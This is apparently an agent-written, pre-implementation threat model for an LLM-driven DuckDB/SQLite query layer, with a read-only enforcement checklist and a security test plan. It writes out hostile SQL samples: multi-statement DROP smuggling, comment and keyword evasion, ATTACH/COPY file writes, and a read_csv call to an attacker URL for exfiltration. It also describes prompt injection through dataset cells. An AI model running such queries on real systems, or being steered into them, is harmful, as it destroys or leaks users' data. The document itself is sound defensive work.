# SQL Layer Threat Model (Wave 1, pre-implementation)

Author: SECURITY-ENGINEER (Wave 1)
Date: 2026-08-24
Status: **Proactive** -- written before SQL-ENGINEER's implementation exists in this
worktree. This is the checklist the orchestrator should review SQL-ENGINEER's actual
code against once this wave merges. Nothing in this document assumes any detail about
that implementation beyond what's already decided in `.agent/decisions.md`: **DuckDB +
SQLite**, embedded, no server.

## 1. What's changing, threat-wise

Today (per `.agent/architecture.md` section 4/7): there is no SQL layer. The entire
analytical surface is a fixed set of Python functions (`app/tools/*.py`) called with a
constrained JSON-schema argument shape (column name, operator from a fixed enum,
value) -- see `app/agent/tool_router.py::FILTERS_SCHEMA`. An LLM can pick *which*
pre-written pandas operation runs and *what column/value* to run it against, but it can
never supply arbitrary code or an arbitrary query string that gets executed.

A SQL layer inverts that: the natural design (LLM writes a SQL query, given the schema,
to answer a question) means the LLM-generated string becomes something that gets
**executed**, not just interpreted as structured parameters. That is a categorically
new trust boundary, and it exists whether the SQL text comes from the LLM, from a
"power user SQL box" in the UI, or from a saved/shared query -- **all three are the
same threat if any of them exist**, so this model treats "the SQL text" as untrusted
regardless of who/what produced it.

## 2. Threat actors and entry points

| Actor | Entry point | Motive |
|---|---|---|
| The LLM itself (misaligned, jailbroken, or just wrong) | Generates the SQL text from a user question | Not malicious by default, but a jailbroken or confused model could emit destructive SQL if nothing stops it -- this is the *primary* threat, more likely than #2 below in this product |
| A user with API access (no auth exists today -- see architecture.md #7, "Authentication / authorization: none") | Directly crafts a prompt engineered to make the LLM emit a specific SQL string, or (if a raw-SQL endpoint/UI box ever exists) submits SQL directly | Data exfiltration, DoS, tampering with any writable resource reachable from the DB connection |
| Adversarial dataset content (ties into the prompt-injection gap, section 3 of this doc's companion assessment) | A crafted cell value flows into context, then into a subsequent LLM-generated query | Indirect: manipulate the LLM into generating a malicious query on the attacker's behalf |

Given **no auth exists** on this API today (architecture.md #7), *any* network-reachable
client is already "the user" from the SQL layer's point of view. The SQL layer cannot
assume a trusted caller. This should be flagged again to the orchestrator independently
of this document: shipping a SQL execution layer onto an unauthenticated API is a
materially bigger step than shipping more pandas tools was, even with perfect
query-validation, because validation bugs are inevitable and auth is the actual
backstop.

## 3. The injection surface, concretely

Even with the query originating from a controlled code path (not raw string
concatenation of user input into SQL text -- that's SQL 101 and assumed already
avoided), a SQL layer built around "let the LLM write a query, then execute it" has
these injection vectors specific to *this* project:

1. **The LLM as the injector.** The LLM's output *is* the query. There is no way to
   parameterize "the whole query" the way you parameterize a value -- the validation
   has to happen on the generated SQL text itself, after generation, before execution.
2. **Multi-statement smuggling via `;`.** `SELECT * FROM t; DROP TABLE t;` -- if the
   execution path uses a driver/method that allows multiple statements in one call
   (DuckDB's Python API and `sqlite3` both support `executescript`-style multi-statement
   execution if you reach for it), a single generated string can carry a second,
   destructive statement.
3. **Comment-hiding tricks.** `SELECT * FROM t -- ATTACH DATABASE ...` or
   `SELECT * FROM t /* */ ; ATTACH ...` -- validating only the "visible" first
   statement via naive string checks (e.g. `.upper().startswith("SELECT")`) is
   insufficient; a real SQL parser (or an actual AST-based allowlist) is required, not
   regex/prefix checks.
4. **DuckDB-specific write/escape surfaces**, several of which are easy to miss because
   they don't look like classic DML:
   - `ATTACH '<path>' AS db` / `ATTACH ':memory:'` -- lets a query attach an arbitrary
     file as a new writable (or even a network-reachable, via `httpfs`) database.
   - `COPY <table> TO '<path>'` / `COPY (<query>) TO '<path>'` -- arbitrary file write
     to any path the process can reach; this is a path-traversal-shaped SQL feature,
     directly analogous to the file-upload path-traversal risk already mitigated
     elsewhere in this codebase (`app/datasets/storage.py`) -- the SQL layer needs its
     own equivalent guarantee, it does not inherit the upload path's protection.
   - `EXPORT DATABASE '<path>'` -- bulk file write, same class of risk as `COPY`.
   - `PRAGMA` statements that are not read-only: e.g. anything that changes DuckDB
     settings that affect subsequent I/O (`SET`), or SQLite's `PRAGMA writable_schema`,
     `PRAGMA journal_mode`. Not every `PRAGMA` is a write, but the read-only allowlist
     must be built as an **allowlist of specific safe pragmas**, never a blocklist of
     known-bad ones (blocklists miss new/undocumented pragmas by construction).
   - DuckDB's `read_csv`/`read_parquet`/`read_json` table functions with a **URL**
     argument (`read_csv('https://attacker/exfil?data=...')`) -- these can both read
     attacker-controlled remote content into the query AND (combined with a crafted
     query) act as an exfiltration channel by encoding query results into the request
     URL of a *subsequent* generated query, if the LLM can be induced to do so across
     turns. This is a DuckDB-flavored SSRF/exfil risk with no pandas-tool equivalent
     today.
   - SQLite's `ATTACH DATABASE` has the same file-open risk as DuckDB's `ATTACH`.
   - User-defined functions / extensions: DuckDB supports loading extensions
     (`INSTALL`/`LOAD`), some of which (e.g. `httpfs`, `shell`-like community
     extensions) expand the capability surface far past "run a SELECT". These must be
     disabled/never loaded on a connection that executes LLM-generated SQL, not merely
     "not mentioned in the schema shown to the LLM" -- the LLM (or an injected payload)
     doesn't need to be told an extension exists to try loading it.
5. **Resource-exhaustion queries that are technically read-only.** `SELECT * FROM
   huge_table CROSS JOIN huge_table`, unbounded recursive CTEs, or a query with no
   `LIMIT` against a large table are not "injection" in the classic sense but are a
   real DoS vector once real (large) data is in play -- ties directly into the
   LARGE-DATA team's scope (architecture.md notes the whole-dataset-in-RAM constraint
   already; a SQL layer over a 10M+ row DuckDB table removes that ceiling and replaces
   it with "an unbounded query can still exhaust memory/CPU").
6. **Schema/metadata disclosure beyond the intended dataset.** If the SQL layer's
   connection has visibility into anything beyond the one uploaded dataset (e.g. a
   shared DuckDB file, `information_schema`, `sqlite_master`, or other attached
   databases from a previous session if connections/state are ever reused across
   requests), a generated query could enumerate or read data the requesting user never
   uploaded. Given today's per-request/per-dataset model (one DataFrame per
   `DatasetRecord`), the SQL layer's per-query scope must preserve that same isolation
   -- one connection/catalog visible per dataset, not a shared catalog across all
   uploaded datasets.

## 4. What "read-only enforcement" must guarantee

A concrete checklist, phrased as guarantees, not intentions:

- [ ] **Statement-type allowlist, not blocklist.** Only `SELECT` (and DuckDB's
      read-only table functions on already-permitted sources) may execute. Everything
      else -- `INSERT`, `UPDATE`, `DELETE`, `DROP`, `ALTER`, `CREATE`, `TRUNCATE`,
      `REPLACE`, `MERGE`, `ATTACH`, `DETACH`, `COPY`, `EXPORT`, `IMPORT`, `INSTALL`,
      `LOAD`, `SET`, `PRAGMA` (except an explicit safe-pragma allowlist), `CALL`,
      `VACUUM`, `CHECKPOINT` -- is rejected by default. New DuckDB/SQLite syntax added
      in a future version must be rejected by default too (allowlist property, not "we
      blocked everything we thought of").
- [ ] **Enforced by the database connection itself, not just the query text.** The
      strongest guarantee is a connection/user that is *actually* incapable of writing
      at the engine level (e.g. SQLite opened with `mode=ro` in the URI, or a DuckDB
      connection with write-affecting settings/extensions disabled at connection time),
      so that a validator bug is not the *only* thing standing between a query and a
      write. Defense in depth: validate the text AND open the connection read-only.
- [ ] **Single-statement enforcement.** Reject any input containing more than one
      top-level statement, determined by actually parsing the SQL (not by counting `;`
      characters naively, since `;` can appear inside a string literal or comment).
- [ ] **Comments stripped/accounted for before validation**, or validation performed on
      a real parse tree where comments are not part of the executable structure at all
      (preferred) -- never a substring/regex check on raw text that a comment or
      whitespace trick can evade.
- [ ] **No `ATTACH`/`DETACH`/`COPY ... TO`/`EXPORT DATABASE`/file-writing table
      functions reachable**, full stop -- these have no legitimate use case in "answer
      a question about the uploaded dataset" and should be blocked structurally
      (connection-level capability, not query-text pattern matching).
- [ ] **No extension loading** (`INSTALL`/`LOAD`) on the query-execution connection.
- [ ] **No remote data sources** reachable from a generated query (`read_csv('http://
      ...')` etc.) unless that is an explicit, separately-reviewed product feature --
      default posture is local-file/in-memory-dataset only.
- [ ] **Query timeout and resource limits** (row/byte output cap, execution time cap,
      memory cap where the engine supports it) enforced independent of query content,
      so an accidentally-or-adversarially expensive but technically-valid `SELECT`
      cannot exhaust the process.
- [ ] **Per-dataset catalog isolation.** A query against dataset A's connection/catalog
      must not be able to see or reference dataset B's data, `information_schema`
      contents beyond A's own table(s), or any file path not explicitly the one
      uploaded/registered for A.
- [ ] **The error path reuses the sanitization pattern already established in this
      codebase** (`app/agent/providers.py::_friendly_error_message`,
      `app/main.py`'s global handler): a rejected/failed query must return a clean,
      generic-enough message to the LLM/user, never the database engine's raw error
      text verbatim if that text could contain file paths, other table/column names
      from the same process, or internal engine details. (This is a real, not
      hypothetical, precedent in this exact codebase -- see `test_providers.py`'s
      reproduction of a real leaked-detail incident with the LLM provider.)
- [ ] **Every guarantee above is enforced identically regardless of the SQL's origin**
      -- LLM-generated, a hypothetical future "power user SQL box" in the UI, or a
      saved/shared query. Do not build the validator only into "the LLM tool" if a
      direct SQL endpoint is ever added later; the enforcement point should be the
      execution function itself, not the caller.

## 5. What the test suite for this must cover

Mirroring the structure of this project's existing security tests
(`test_malicious_files.py`, `test_providers.py`, and this wave's
`test_security_error_sanitization.py` / `test_security_upload_hardening.py` /
`test_prompt_injection_gap.py`), the SQL layer's test suite should include, at minimum:

**Statement-type rejection (one test per statement type, not a single combined test)**
- `INSERT INTO ... VALUES (...)` rejected
- `UPDATE ... SET ...` rejected
- `DELETE FROM ...` rejected
- `DROP TABLE ...`, `DROP DATABASE ...` rejected
- `ALTER TABLE ...` rejected
- `CREATE TABLE ...`, `CREATE VIEW ...` rejected
- `TRUNCATE ...` rejected (where applicable)
- `ATTACH '...' AS ...` rejected
- `DETACH ...` rejected
- `COPY ... TO '...'` and `COPY ... FROM '...'` both rejected
- `EXPORT DATABASE '...'` / `IMPORT DATABASE '...'` rejected
- `INSTALL <extension>` / `LOAD <extension>` rejected
- `PRAGMA` that is not on the explicit safe list rejected; the safe-list pragmas
  themselves verified to actually be read-only (don't just trust the pragma's name)
- `SET <setting> = ...` rejected (or narrowly allowlisted if a specific setting is
  proven safe and needed)

**Injection/evasion technique tests**
- Multi-statement via `;` (`SELECT 1; DROP TABLE x;`) rejected
- Multi-statement hidden after a line comment (`SELECT 1 -- ; is this one statement?\n;DROP TABLE x;`)
- Multi-statement hidden inside a block comment
- Statement keyword hidden via mixed case / whitespace / SQL comments inside the
  keyword (a classic WAF-evasion pattern: `DR/**/OP TABLE x`) -- proves the validator
  parses rather than pattern-matches
- A `;` character appearing inside a legitimate string literal value (e.g. filtering
  `WHERE product = 'a;b'`) is NOT falsely rejected -- a false-positive/usability test,
  as important as the true-positive tests
- A UNION-based attempt to read a table/column outside the intended dataset's schema
- A query referencing `sqlite_master` / DuckDB's `information_schema` /
  `duckdb_tables()` or similar catalog-introspection functions, to confirm catalog
  isolation holds (or is explicitly, intentionally allowed for the one owned dataset
  only, and verified to stop there)
- A crafted table/column *name* (if the schema is ever partially LLM- or
  user-influenced, e.g. a "rename this column" feature) containing SQL keywords or
  injection-shaped text, run through the actual query builder/executor

**Resource / DoS tests**
- A query timeout actually fires and returns a clean error for a deliberately slow
  query (e.g. a cross join or recursive CTE against a moderately sized fixture -- sized
  so the test itself stays fast, the way this wave's billion-laughs xlsx test uses a
  bounded-but-representative payload rather than an actually-unbounded one)
- An output-size cap is enforced (query that would return far more rows/bytes than the
  configured limit is truncated or rejected, not streamed unbounded into the LLM's
  context -- this is the SQL-layer's version of the `generate_business_insights`
  payload-bloat bug already fixed this session for the pandas tools; the SQL layer will
  reintroduce that exact failure mode at a much larger scale unless bounded from day
  one)

**Read-only guarantee at the connection level**
- After executing a representative read query, assert the underlying file(s)
  (SQLite `.db` file mtime/hash, or a DuckDB-backed file) are byte-for-byte unchanged
  -- a true end-to-end guarantee, not just "the validator rejected the string."
- Attempt a write through a mechanism that bypasses the text validator entirely (e.g.
  call the connection's own execute method directly in the test with a write
  statement) to prove the read-only guarantee lives at the connection/permission
  level, not solely in application-level string validation -- this is the single most
  important test in the whole suite, because it is the only one that still protects
  against a validator bug.

**Error-sanitization tests (SQL-flavored version of this wave's provider tests)**
- A query that fails against a real file path (e.g. references a table that doesn't
  exist, or a malformed query) must not leak the underlying database file's absolute
  filesystem path, other table names in the same file, or raw engine exception text to
  the end user -- same pattern as `test_security_error_sanitization.py` in this wave,
  applied to the SQL engine's own exception types instead of `httpx`'s.

## 6. Explicit non-goals of this document

This document does not attempt to specify the SQL layer's query-*generation* prompt,
its schema-description format shown to the LLM, or performance characteristics --
those are SQL-ENGINEER's and LARGE-DATA's design decisions. This document specifies
only the security *guarantees* that implementation must satisfy, independent of how it
achieves them.
